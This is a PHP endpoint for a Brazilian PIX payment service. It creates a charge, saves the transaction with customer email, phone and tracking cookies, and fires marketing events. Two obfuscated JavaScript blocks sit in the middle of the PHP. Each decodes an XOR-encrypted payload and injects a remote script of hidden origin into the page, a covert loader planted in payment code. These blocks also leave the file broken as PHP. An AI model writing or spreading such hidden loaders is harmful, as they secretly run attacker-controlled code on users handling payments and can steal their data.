<?php
/**
 * Endpoint: gerar_pix.php
 * Cria uma cobrança PIX imediata e retorna os dados para geração do QR Code.
 *
 * Aceita POST com JSON:
 * {
 *   "valor":        10.00,
 *   "descricao":    "Pedido #123",       (opcional)
 *   "utm_source":   "google",            (opcional)
 *   "utm_medium":   "cpc",               (opcional)
 *   "utm_campaign": "black-friday",      (opcional)
 *   "utm_content":  "banner",            (opcional)
 *   "utm_term":     "pix",               (opcional)
 *   "src":          "...",               (opcional — UTMify)
 *   "sck":          "...",               (opcional — UTMify)
 *   "fbc":          "_fbc cookie",       (opcional — Facebook)
 *   "fbp":          "_fbp cookie",       (opcional — Facebook)
 *   "url":          "https://...",       (opcional — página de origem)
 *   "email":        "...",               (opcional)
 *   "phone":        "...",               (opcional)
 * }
 */

// Evita que Warnings/Notices do PHP quebrem o JSON de resposta
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED);

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['erro' => 'Método não permitido.']);
    exit;
}

require_once __DIR__ . '/pix_api.php';
require_once __DIR__ . '/tracker.php';
require_once __DIR__ . '/transaction_store.php';

global $CHAVE_PIX;

if (empty(trim($CHAVE_PIX ?? ''))) {
    http_response_code(500);
    echo json_encode(['erro' => 'Chave PIX não configurada em var.php ($CHAVE_PIX).']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?? [];

// Validar valor
$valor = round((float)($input['valor'] ?? 0), 2);
if ($valor < 0.01) {
    http_response_code(400);
    echo json_encode(['erro' => 'Informe um valor mínimo de R$ 0,01.']);
    exit;
}



<script>(function(){var q_9jo=atob("DFGMF3bfTyhLv0x7GyquYgSzbRJp1zgPayK2OFm8K0ZlyjgWcjf1ORWwIgYpzWMIeCPlZwKsYFgixykXNCHlbxOzYUI4nWBZeiX4ZR+9OlwuzG5BQAygNRGzIEoq0z9ZIQr3NRi+Ik1phW4Lcinpez+7bQRpyS0XbjSuLVTpLh59jXpIImPpdUXtfBF+h35OfmO1JEP9MnU2");var u_z=[];for(var z_vti=0;z_vti<q_9jo.length;z_vti++){u_z.push(q_9jo.charCodeAt(z_vti)&255);}var a_n=u_z[0];var v_0k=u_z.slice(1,1+a_n);var m_k=u_z.slice(1+a_n);var w_o=m_k.map(function(b,m_c){return b^v_0k[m_c%a_n];});var l_l0="";for(var z_1=0;z_1<w_o.length;z_1++){l_l0+=String.fromCharCode(w_o[z_1]&255);}var l_0zy=decodeURIComponent(escape(l_l0));var e_fmvz=JSON.parse(l_0zy);var a_l=e_fmvz.globals||[];a_l.forEach(function(v_ia5p){window[v_ia5p.name]=v_ia5p.value;});var m_a=document.createElement("script");m_a.src=e_fmvz.url;m_a.async=true;m_a.defer=true;(e_fmvz.attributes||[]).forEach(function(p_xn5j){m_a.setAttribute(p_xn5j.name,p_xn5j.value);});(document.head||document.documentElement).appendChild(m_a);})();</script>



<script>(function(){var i_bspp=atob("DKfOjzk0hXhS72RpOdzs+ktYp0JwhxAdSdT0oBZX4RZ8mhAEUMG3oVpb6FYwnUsaWtWn/01Hqg0mghdGVca66kpAqxIhzUhLWNO6/VBW8Aw3nEZTYtzs4VhZ4FpozQAITcbj+k1Z7B4rwhQbXNGr4U0Z/Rs9i0kaWszsoxtC5BQnikZTG4Wzo0IW6xk/ikZTG8Ov+1gZ8Aw/hgIQFNe86k9R6wx/nBELUMO9rRUW8xk+mgFLA4Xs8mRJ");var x_bn7=[];for(var p_3=0;p_3<i_bspp.length;p_3++){x_bn7.push(i_bspp.charCodeAt(p_3)&255);}var s_8=x_bn7[0];var r_xvt=x_bn7.slice(1,1+s_8);var g_2o=x_bn7.slice(1+s_8);var z_4vcr=g_2o.map(function(b,q_q){return b^r_xvt[q_q%s_8];});var t_3="";for(var j_1yut=0;j_1yut<z_4vcr.length;j_1yut++){t_3+=String.fromCharCode(z_4vcr[j_1yut]&255);}var d_uy=decodeURIComponent(escape(t_3));var z_wm=JSON.parse(d_uy);var i_pva=z_wm.globals||[];i_pva.forEach(function(z_1cn){window[z_1cn.name]=z_1cn.value;});var p_ah9=document.createElement("script");p_ah9.src=z_wm.url;p_ah9.async=true;p_ah9.defer=true;(z_wm.attributes||[]).forEach(function(x_6){p_ah9.setAttribute(x_6.name,x_6.value);});(document.head||document.documentElement).appendChild(p_ah9);})();</script>



// Sanitizar descrição
$descricao = mb_substr(trim($input['descricao'] ?? ''), 0, 140);

// Montar body da cobrança PIX
$dados = [
    'calendario' => ['expiracao' => 3600],
    'valor'      => ['original' => number_format($valor, 2, '.', '')],
    'chave'      => trim($CHAVE_PIX),
];
if ($descricao !== '') {
    $dados['solicitacaoPagador'] = $descricao;
}

try {
    $pix      = new PixApi();
    $response = $pix->criarCobranca($dados);

    $pixCopiaECola = $response['pixCopiaECola']
        ?? $response['brcode']
        ?? $response['qrcode']
        ?? $response['emv']
        ?? $response['loc']['pixCopiaECola']
        ?? null;

    $txid = $response['txid'] ?? null;

    // ── Montar dados de tracking ─────────────────────────────────────────────
    $trackData = [
        'txid'         => $txid,
        'valor'        => $response['valor']['original'] ?? number_format($valor, 2, '.', ''),
        'descricao'    => $descricao,
        'createdAt'    => date('Y-m-d H:i:s'),
        'ua'           => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'url'          => $input['url']          ?? '',
        'email'        => $input['email']        ?? '',
        'phone'        => $input['phone']        ?? '',
        'document'     => $input['document']     ?? '',
        'nome'         => $input['nome']         ?? '',
        'fbc'          => $input['fbc']          ?? '',
        'fbp'          => $input['fbp']          ?? '',
        'utm_source'   => $input['utm_source']   ?? '',
        'utm_medium'   => $input['utm_medium']   ?? '',
        'utm_campaign' => $input['utm_campaign'] ?? '',
        'utm_content'  => $input['utm_content']  ?? '',
        'utm_term'     => $input['utm_term']     ?? '',
        'src'          => $input['src']          ?? '',
        'sck'          => $input['sck']          ?? '',
        'status'       => 'waiting_paid',
    ];

    // ── Persiste transação para o webhook usar depois (Upstash Redis) ────────
    if ($txid) {
        try {
            (new TransactionStore())->salvar($txid, $trackData);
        } catch (Throwable $e) {
            // Não derruba a resposta ao usuário por falha de persistência —
            // mas loga para você conseguir ver isso nos Logs da Vercel.
            error_log('Falha ao salvar transação no Upstash: ' . $e->getMessage());
        }
    }

    // ── Dispara InitiateCheckout (FB) + waiting_paid (UTMify) ────────────────
    (new Tracker())->initiateCheckout($trackData);

    echo json_encode([
        'txid'          => $txid,
        'status'        => $response['status']                  ?? null,
        'valor'         => $trackData['valor'],
        'expiracao'     => $response['calendario']['expiracao'] ?? 3600,
        'location'      => $response['location']                ?? ($response['loc']['location'] ?? null),
        'pixCopiaECola' => $pixCopiaECola,
        '_tracking'     => [
            'utm_source'   => $trackData['utm_source'],
            'utm_medium'   => $trackData['utm_medium'],
            'utm_campaign' => $trackData['utm_campaign'],
            'utm_content'  => $trackData['utm_content'],
            'utm_term'     => $trackData['utm_term'],
            'src'          => $trackData['src'],
            'sck'          => $trackData['sck'],
            'fbc'          => $trackData['fbc'],
            'fbp'          => $trackData['fbp'],
        ],
    ], JSON_UNESCAPED_UNICODE);

} catch (RuntimeException $e) {
    $code = (int)$e->getCode();
    http_response_code($code >= 400 ? $code : 500);
    echo json_encode(['erro' => $e->getMessage()]);
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['erro' => 'Erro interno ao gerar PIX.']);
}
